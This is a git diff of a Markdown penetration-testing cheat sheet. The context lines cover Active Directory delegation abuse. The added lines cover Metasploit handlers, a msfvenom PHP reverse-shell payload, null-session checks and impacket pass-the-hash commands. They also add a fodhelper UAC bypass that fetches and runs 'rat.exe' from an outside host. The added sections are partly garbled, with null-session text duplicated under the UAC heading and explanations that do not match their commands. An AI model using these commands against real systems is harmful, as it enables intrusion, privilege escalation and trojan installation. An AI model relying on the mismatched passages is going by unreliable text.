@@ -151,8 +151,6 @@ Start with automated tools to search for low hanging fruits
           
           
           First off, download two PS scripts in local machine..
-          <br>
-
 
 ```bash
 wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
@@ -172,6 +170,7 @@ Import-Module .\Powermad.ps1
 1. **Check User's Permission and Windows Versions**
 
     Check if users are allowed to create a new computer object on the domain.
+
     ```bash
     Get-DomainObject -Identity "dc=example,dc=com" -Domain example.com
 
@@ -181,6 +180,7 @@ Import-Module .\Powermad.ps1
     ```
 
     And check if the machine is at least Windows Server 2012.
+
     ```bash
     Get-DomainController
 
@@ -190,6 +190,7 @@ Import-Module .\Powermad.ps1
     ```
 
     Additionally, check if the target computer does not have the attributes **“msds-allowedtoactionbehalfofotheridentity”** set.
+
     ```bash
     hostname
     Get-NetComputer <hostname> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
@@ -210,6 +211,7 @@ Import-Module .\Powermad.ps1
 2. **Create a New Computer**
 
     Now you can create a new computer object.
+
     ```bash
     New-MachineAccount -MachineAccount TEST01 -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)
     Get-DomainComputer test01
@@ -220,6 +222,7 @@ Import-Module .\Powermad.ps1
     ```
 
     Create a new raw security descriptor.
+
     ```bash
     $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<objectid-of-a-new-computer>)"
     $SDBytes = New-Object byte[] ($SD.BinaryLength)
@@ -400,3 +403,122 @@ int main(void){
   </blockquote></details>
 </blockquote></details>
 
+
+<br/>
+<br/>
+
+## Metasploit 
+#### ./ Multi Use Handlers
+
+```bash 
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD <Payload name>
+msf6 > set LHOST <LHOST value>
+msf6 > set LPORT <LPORT value>
+msf6 > set ExitOnSession false
+msf6 > exploit -j -z
+```
+<br/>
+Once the required values are completed the following command will execute your handler: ‘msfconsole -L -r' 
+<br/>
+<br/>
+
+#### ./ Scripting Payloads
+PHP
+
+```bash
+msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
+```
+
+<br/>
+
+## Python
+#### ./ Spawn a terminal
+
+```python
+python -c 'import pty;pty.spawn("/bin/bash")';
+```
+<details> 
+  <summary> <b>Checking for Null Sessions</b> </summary>
+
+To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.
+
+To connect, you have to type the following command in a Windows shell:
+
+```bash
+> NET USE \\<target IP address>\IPC$ '' /u:''
+```
+
+This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
+
+Let's try the command on our target:
+
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
+<br/>
+
+
+The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
+  
+Example:
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
+<br/>
+You can also perform the very same checks by using smbclient:
+  
+  proxychains faketime -f +8h impacket-wmiexec -k -no-pass user@10.10.10.10
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
+</details>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <details> 
+  <summary> <b>UAC Bypass</b> </summary>
+    
+    
+ https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper
+
+```ps
+https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper
+iwr -Uri http://10.10.10.11/rat.exe -Outfile C:\rat.exe
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe -exec bypass -c C:\rat.exe" -Force
+
+execute the binary
+C:\Windows\System32\fodhelper.exe
+```
+    
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
+<br/>
+
+
+The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
+  
+Example:
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
+<br/>
+You can also perform the very same checks by using smbclient:
+    
+    proxychains impacket-psexec -no-pass Administrator@10.10.10.10 -hashes :admin_hash>`
+<br/>
+<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
+</details>
+If skew is -30 minutes 
+The command would be 
+faketime -f -30m
